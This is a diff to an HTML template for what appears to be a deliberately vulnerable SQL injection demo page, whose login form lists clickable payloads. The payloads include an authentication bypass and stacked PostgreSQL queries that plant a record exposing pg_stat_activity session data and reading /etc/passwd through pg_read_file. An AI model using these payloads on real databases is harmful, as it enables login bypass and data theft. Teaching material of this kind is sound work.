@@ -3,8 +3,10 @@
   <title>Demo</title>
   <script>
 function sv() {
-  var t = window.event.target.innerText
-  document.getElementsByName('login')[0].value = t
+  var e = window.event.target
+  e.style.color = '#000'
+  var t = e.innerText
+  document.getElementsByName('login')[0].value = t.replaceAll('\n', ' ') // elsewhere EOLs just disappear
   document.getElementsByName('password')[0].value = ''
   ch(t)
 }
@@ -20,30 +22,63 @@ function ch(t) {
 }
   </script>
   <style>
-html, body { font-family: "Helvetica",sans-serif; font-size: 120%; }
-input, button { font-family: inherit; font-size: inherit; }
-pre { background: #f0f0f0; cursor: pointer; padding: 10px; margin: 10px; white-space: pre-wrap; }
+html, body { font-family: "Helvetica",sans-serif; font-size: 140%; }
+input, button, th, td, tr, table { font-family: inherit; font-size: inherit; }
+pre { background: #eee; color: #eee; cursor: pointer; padding: 10px; margin: 10px; white-space: pre-wrap; }
+th { text-align: right; }
+td, th { vertical-align: top; }
   </style>
 </head>
 <body>
-<a href="/"><h1>Demo</h1></a>
+<a href="/"><h3>Demo</h3></a>
 <form method="get" action="/balance" autocomplete="off">
   {{ if and . (not .Error) }}
-    <pre>
-Name:    {{ .Name }}
-Email:   <b style="color:#060">{{ .Email }}</b>
-Balance: {{ .Currency }} {{ .Balance }}</pre>
+    <table>
+      <tr><th>Name:</th><td>{{ .Name }}</td></tr>
+      <tr><th>Email:</th><td style="color:#060;white-space:pre-wrap">{{ .Email }}</td></tr>
+      <tr><th>Balance:</th><td>{{ .Currency }} {{ .Balance }}</td></tr>
+    </table>
   {{ else }}
-    {{ if .Error }}<h2 style="color:#f00">{{ .Error }}</h2>{{ end }}
+    {{ if .Error }}<h3 style="color:#f00;border:1px solid #f00;background-color:#ff0;padding:1em">{{ .Error }}</h3>{{ end }}
     login: <input type="text" name="login" oninput="ch()"></input>
     password: <input type="text" name="password" oninput="ch()"></input>
     <input type="submit" value="Go"></input>
-    <pre>select * from users where login='<span style="color:#f00"></span>' and password='<span style="color:#f00"></span>'</pre>
+    <hr/>
+    <pre style="border:1px solid #000;color:#000;background-color:#efe;">select * from users where login='<span style="color:#f00"></span>' and password='<span style="color:#f00"></span>'</pre>
     <pre onclick="sv()">'</pre>
     <pre onclick="sv()">' or true limit 1 --</pre>
     <pre onclick="sv()">' or true limit 1 offset 1 --</pre>
-    <pre onclick="sv()">'; insert into accounts (login, password, name, email, currency, balance) select 'x', 'xx', ':-]', string_agg(concat(application_name, e'\n', user, e'\n', client_addr, e'\n', query), e'\n\n'), 'RUR', 1000000 from pg_stat_activity where query &lt;&gt; '' on conflict (login) do update set email=excluded.email; --</pre>
-    <pre onclick="sv()">'; insert into accounts (login, password, name, email, currency, balance) select 'x', 'xx', '(o_o)', pg_read_file('/etc/passwd'), 'RUR', 1000000 on conflict (login) do update set email=excluded.email; --</pre>
+    <pre onclick="sv()">';
+insert into accounts (
+  login,
+  password,
+  name,
+  email,
+  currency,
+  balance
+)
+select
+  'x',
+  'xx',
+  ':-]',
+  string_agg(
+    concat(
+      application_name, e'\n',
+      user, e'\n',
+      client_addr, e'\n',
+      query
+    ),
+    e'\n\n'
+  ),
+  'RUR',
+  1000000
+from pg_stat_activity
+where query &lt;&gt; ''
+on conflict (login) do update set email=excluded.email; --</pre>
+    <pre onclick="sv()">';
+insert into accounts (login, password, name, email, currency, balance)
+values ('x', 'xx', '(o_o)', pg_read_file('/etc/passwd'), 'RUR', 1000000)
+on conflict (login) do update set email=excluded.email; --</pre>
   {{ end }}
 </form>
 </body>
